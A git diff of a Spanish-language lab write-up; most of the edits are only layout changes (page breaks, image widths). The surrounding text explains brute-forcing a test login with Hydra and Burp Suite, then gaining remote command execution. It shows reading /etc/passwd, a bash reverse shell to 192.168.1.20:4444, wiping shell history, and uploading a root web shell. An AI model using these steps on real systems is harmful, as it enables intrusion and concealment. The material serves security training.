@@ -195,6 +195,8 @@ Si le damos a Network y enviamos unas credenciales erroneas, veremos que se env�
 
 image::assets/Fuerza Bruta/Diccionario/POST.png[POST,align=center]
 
+<<<
+
 Nuestro comando en hydra es:
 
 [source, bash]
@@ -225,15 +227,15 @@ De esta forma, podremos acceder mediante el uso de diccionarios, pero en este ca
 
 Primeramente recomiendo instalar FoxyProxy en nuestro navegador. Cuando estemos dentro de este, deberemos irnos a Proxies y crear uno nuevo dándole a Add. Deberemos poner la siguiente configuración, para interceptar con Burpsuite en local desde el puerto 8081. Además deberemos añadir en la parte de patrones el que aparece en la siguiente imagen:
 
-image::assets/Fuerza Bruta/Diccionario/Burp/FoxyProxy.png[FoxyProxy Config,align=center]
+image::assets/Fuerza Bruta/Diccionario/Burp/FoxyProxy.png[FoxyProxy Config,width=540,align=center]
 
 Nos vamos a nuestra página donde le daremos al logo de FoxyProxy si lo hemos puesto en la barra de herramientas y le damos al proxy que hemos creado.
 
-image::assets/Fuerza Bruta/Diccionario/Burp/FoxyProxy2.png[FoxyProxy Navegador,align=center]
+image::assets/Fuerza Bruta/Diccionario/Burp/FoxyProxy2.png[FoxyProxy Navegador,width=540,align=center]
 
 Ahora abrimos Burpsuite y creamos un proyecto temporal, ya que tendremos la versión de la comunidad, iniciándolo por defecto. Cuando esté abierto, nos vamos a la configuración del proxy donde pondremos la IP y puerto que hemos configurado en FoxyProxy. 
 
-image::assets/Fuerza Bruta/Diccionario/Burp/Burp1.png[Burpsuite,align=center]
+image::assets/Fuerza Bruta/Diccionario/Burp/Burp1.png[Burpsuite,width=540,align=center]
 
 En Burpsuite, en la parte de Proxy, le damos a *Intercept off* para pasarlo a *on* y comenzar a capturar el tráfico. Y en nuestra página ponemos cualquier credenciales y le damos a entrar, enviándonos a Burpsuite directamente.
 
@@ -253,15 +255,15 @@ image::assets/Fuerza Bruta/Diccionario/Burp/Intruder2.png[Intruder2,align=center
 
 A la derecha nos pedirá igresar un payload, es decir, los diccionarios y deberemos poner el correspondiente payload en la posición correcta. En el 1 va el de los usuario y le pongo el diccionario de nombres de usuario frecuentes y en el 2 va la contraseña y por ello le pongo el diccionario de contraseñas sencillas.
 
-image::assets/Fuerza Bruta/Diccionario/Burp/Intruder3.png[Intruder3,align=center]
+image::assets/Fuerza Bruta/Diccionario/Burp/Intruder3.png[Intruder3,width=580,align=center]
 
-image::assets/Fuerza Bruta/Diccionario/Burp/Intruder4.png[Intruder4,align=center]
+image::assets/Fuerza Bruta/Diccionario/Burp/Intruder4.png[Intruder4,width=580,align=center]
 
 Además en la configuración del Intruder deberemos cambiar dos cosas:
 
 * *Redirections* -> Deberemos poner Always para aceptar las redirecciones.
 
-image::assets/Fuerza Bruta/Diccionario/Burp/IntruderRedirections.png[Ajuste Redirecciones,align=center]
+image::assets/Fuerza Bruta/Diccionario/Burp/IntruderRedirections.png[Ajuste Redirecciones,width=300,align=center]
 
 * *Grep - Extract* -> Como hemos hecho antes en el caso de Hydra, deberemos indicarle el mensaje de error. Principalmente se usa para delimitar cuando empieza y cuando acaba el ataque. Por desgracia, no nos aparecerá con nuestra página. Por lo que deberemos estar atentos al cambio de longitud.
 
@@ -272,6 +274,8 @@ image::assets/Fuerza Bruta/Diccionario/Burp/Entrar.png[Pasar el login,align=cent
 Cuando quitemos la interceptación del proxy, podremos ver cómo hemos entrado:
 
 image::assets/Fuerza Bruta/Diccionario/Burp/Entrar2.png[Pasar el login2,align=center]
+
+<<<
 
 ==== 3. Ataques de fuerza bruta híbrida
 
@@ -327,17 +331,17 @@ image::assets/Fuerza Bruta/Hibrido/Burp/Intruder1.png[Intruder1,align=center]
 
 En este caso vamos a poner unas cuantas palabras en la parte de payload, añadiendo una por una, y luego añadiremos a cada una distintos sufijos.
 
-image::assets/Fuerza Bruta/Hibrido/Burp/Intruder2.png[Intruder2,align=center]
+image::assets/Fuerza Bruta/Hibrido/Burp/Intruder2.png[Intruder2,width=340,align=center]
 
 En la parte de Payload processing, añadiremos los sufijos, para ello le daremos a añadir, en la pestaña buscamos "Add sufix" y ponemos el que queramos, además podemos ponerles incluso prefijos para hacerlo más completo. Pero deberemos activarlos según queramos, ya que si todos están activos se acumulan y eso no lo queremos, por lo que voy a ir uno por uno.
 
-image::assets/Fuerza Bruta/Hibrido/Burp/Intruder3.png[Intruder3,align=center]
+image::assets/Fuerza Bruta/Hibrido/Burp/Intruder3.png[Intruder3,width=520,align=center]
 
-image::assets/Fuerza Bruta/Hibrido/Burp/Intruder4.png[Intruder4,align=center]
+image::assets/Fuerza Bruta/Hibrido/Burp/Intruder4.png[Intruder4,width=520,align=center]
 
 Al final nos debe quedar algo así:
 
-image::assets/Fuerza Bruta/Hibrido/Burp/Intruder5.png[Intruder5,align=center]
+image::assets/Fuerza Bruta/Hibrido/Burp/Intruder5.png[Intruder5,width=340,align=center]
 
 También es importante recordar que en la configuración hay que cambiar lo de las redirecciones a siempre. Dicho esto, vamos a probar el ataque:
 
@@ -364,6 +368,8 @@ hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -p 
 
 image::assets/Fuerza Bruta/Inverso/Hydra/Ataque.png[Ataque,align=center]
 
+<<<
+
 ===== Burpsuite
 
 Como ya hemos visto antes, deberemos hacer lo mismo hasta el punto del Intruder, donde añadiremos los símbolos en el usuario y meteremos un payload para adivinarlo.
@@ -374,6 +380,8 @@ image::assets/Fuerza Bruta/Inverso/Burp/Ataque.png[Ataque,align=center]
 
 Como podemos observar el usuario correcto es *admin*.
 
+<<<
+
 === RCE
 
 Una vez dentro, gracias a los ataques de fuerza bruta, en el panel de administrador se puede acceder a una linea de comandos para administrar desde la web, y también se puede acceder a una página para subir archivos y poder verlos mediante un enlace. A continuación vamos a ver estos dos tipos de ataque RCE:
@@ -382,17 +390,17 @@ Una vez dentro, gracias a los ataques de fuerza bruta, en el panel de administra
 
 Teniendo a nuestra disposición una terminal, vamos a recolectar información para luego hacer una reverse shell y poder efectuar comando con mayor tranquilidad.
 
-image::assets/RCE/CMD/Página.png[Página,align=center]
+image::assets/RCE/CMD/Página.png[Página,width=580,align=center]
 
 ===== Conocer estructura de archivos
 
 * *ls -la* -> Con este comando podemos ver todos los archivos del directorio actual, conociendo sus permisos, usuario y grupo.
 
-image::assets/RCE/CMD/LS.png[comando ls,align=center]
+image::assets/RCE/CMD/LS.png[comando ls,width=600,align=center]
 
 * *pwd* -> Podemos saber en qué directorio estamos
 
-image::assets/RCE/CMD/PWD.png[comando pwd,align=center]
+image::assets/RCE/CMD/PWD.png[comando pwd,width=600,align=center]
 
 ===== Usuarios
 
@@ -407,6 +415,8 @@ image::assets/RCE/CMD/id.png[comando id,align=center]
 * *cat /etc/passwd* -> En este archivo se encuentran los usuarios que existen en el sistema
 
 image::assets/RCE/CMD/passwd.png[archivo passwd,align=center]
+
+<<<
 
 ===== Sistema Operativo
 
@@ -430,6 +440,8 @@ bash -c 'bash -i >& /dev/tcp/192.168.1.20/4444 0>&1'
 ----
 
 image::assets/RCE/CMD/NetCat2.png[NetCat 2,align=center]
+
+<<<
 
 Una vez hecho esto ya estaremos conectados con netcat como root:
 
@@ -478,6 +490,8 @@ $ HISTSIZE=0
 $ HISTFILESIZE=0
 ----
 
+<<<
+
 ** Eliminar el historial con:
 [source,bash]
 ----
@@ -522,17 +536,19 @@ Ahora nos iremos a la parte de subir archivos, donde primeramente provaremos a s
 
 image::assets/RCE/archivos/Página.png[Página,align=center]
 
+<<<
+
 Voy a subir un archivo pdf para comprobar si se pueden ejecutar los archivos:
 
 image::assets/RCE/archivos/PDF1.png[PDF1,align=center]
 
 image::assets/RCE/archivos/PDF2.png[PDF2,align=center]
 
-image::assets/RCE/archivos/PDF3.png[PDF3,align=center]
+image::assets/RCE/archivos/PDF3.png[PDF3,width=500,align=center]
 
 Como podemos observar, podemos abrir estos archivos, por lo que vamos a realizar una web shell con permisos de root:
 
-image::assets/RCE/archivos/WebShell.png[WebShell,align=center]
+image::assets/RCE/archivos/WebShell.png[WebShell,width=440,align=center]
 
 De esta forma, a través de este archivo podremos ejecutar comandos como administrador, deremos usar lo siguiente en la url del archivo "?cmd=(comando)", así enviamos el comando para que el GET lo obtenga y lo pase.
 
